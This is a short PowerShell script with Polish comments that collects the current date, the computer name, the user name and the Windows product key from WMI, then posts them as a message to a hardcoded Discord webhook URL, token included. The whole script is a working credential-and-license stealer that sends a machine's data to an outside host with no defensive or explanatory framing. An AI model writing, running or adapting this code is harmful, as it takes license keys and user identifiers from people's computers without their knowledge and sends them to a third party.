# Definiowanie adresu URL webhooka
$webhookUrl = "https://discordapp.com/api/webhooks/1091083308944851024/bEx6KSvjPXZF7b3HfPc44VhMaQX83UgzzxyBbjZho0X3AG_9pfkskDeMmWfyOKK7D_w7"

# Pobieranie daty, nazwy komputera i nazwy użytkownika
$date = Get-Date -Format "dd.MM.yyyy HH:mm:ss"
$computerName = $env:COMPUTERNAME
$userName = $env:USERNAME

# Pobieranie klucza produktu Windows 10
$key = (Get-WmiObject -query 'select * from SoftwareLicensingService').OA3xOriginalProductKey

# Tworzenie obiektu zawierającego informacje o licencji
$licenseObj = @{
    Date = $date
    ComputerName = $computerName
    UserName = $userName
    License = $key
}

# Tworzenie obiektu zawierającego treść wiadomości Discorda
$messageObj = @{
    content = "Data: $($licenseObj.Date)`nNazwa komputera: $($licenseObj.ComputerName)`nNazwa użytkownika: $($licenseObj.UserName)`nLicencja: $($licenseObj.License)"
}

# Konwertowanie obiektów na format JSON
$jsonMessage = $messageObj | ConvertTo-Json

# Wysyłanie żądania POST na adres URL webhooka
Invoke-WebRequest -Uri $webhookUrl -Method POST -Body $jsonMessage -ContentType "application/json"
